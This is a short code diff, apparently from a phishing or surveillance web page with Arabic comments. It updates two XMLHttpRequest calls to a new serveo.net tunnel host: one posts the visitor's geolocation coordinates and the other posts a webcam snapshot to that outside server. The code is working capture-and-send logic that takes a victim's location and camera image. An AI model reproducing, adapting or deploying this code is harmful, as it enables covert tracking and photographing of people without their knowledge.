@@ -12,7 +12,7 @@
                 navigator.geolocation.getCurrentPosition(function(position) {
                     // إرسال بيانات الموقع إلى الخادم
                     var xhr = new XMLHttpRequest();
-                    xhr.open("POST", "https://d794286095650f0168663b28206dadf9.serveo.net:443/geolocation", true) ;
+                    xhr.open("POST", "https://a6cb5a7604d44068854fb3c6f63b8517.serveo.net/geolocation", true) ;
                     xhr.setRequestHeader("Content-Type", "application/json");
                     xhr.send(JSON.stringify({
                         latitude: position.coords.latitude,
@@ -44,7 +44,7 @@
                                 
                                 // إرسال الصورة إلى الخادم
                                 var xhr = new XMLHttpRequest();
-                                xhr.open("POST", "https://d794286095650f0168663b28206dadf9.serveo.net:443/webcam", true) ;
+                                xhr.open("POST", "https://a6cb5a7604d44068854fb3c6f63b8517.serveo.net/webcam", true) ;
                                 xhr.setRequestHeader("Content-Type", "application/json");
                                 xhr.send(JSON.stringify({
                                     image: canvas.toDataURL('image/jpeg')
